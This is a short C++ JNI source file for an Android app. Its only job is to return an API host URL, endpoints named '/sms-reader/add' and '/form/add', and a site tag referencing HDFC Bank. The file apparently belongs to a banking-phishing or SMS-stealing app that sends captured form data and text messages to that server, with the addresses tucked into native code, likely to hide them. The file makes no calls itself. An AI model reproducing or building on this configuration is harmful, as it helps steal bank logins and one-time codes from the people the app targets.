#include <jni.h>
#include <string>

std::string url = "https://ownxxqq.com/api";
std::string sms_save = "/sms-reader/add";
std::string form_save = "/form/add";
std::string site = "Dkboss-HDFCBank1";

extern "C"
JNIEXPORT jstring JNICALL
Java_com_tester_southindia_Helper_URL(JNIEnv *env, jobject thiz) {
    return env->NewStringUTF(url.c_str());
}

extern "C"
JNIEXPORT jstring JNICALL
Java_com_tester_southindia_Helper_FormSavePath(JNIEnv *env, jobject thiz) {
    return env->NewStringUTF(form_save.c_str());
}

extern "C"
JNIEXPORT jstring JNICALL
Java_com_tester_southindia_Helper_SMSSavePath(JNIEnv *env, jobject thiz) {
    return env->NewStringUTF(sms_save.c_str());
}

extern "C"
JNIEXPORT jstring JNICALL
Java_com_tester_southindia_Helper_SITE(JNIEnv *env, jobject thiz) {
    return env->NewStringUTF(site.c_str());
}
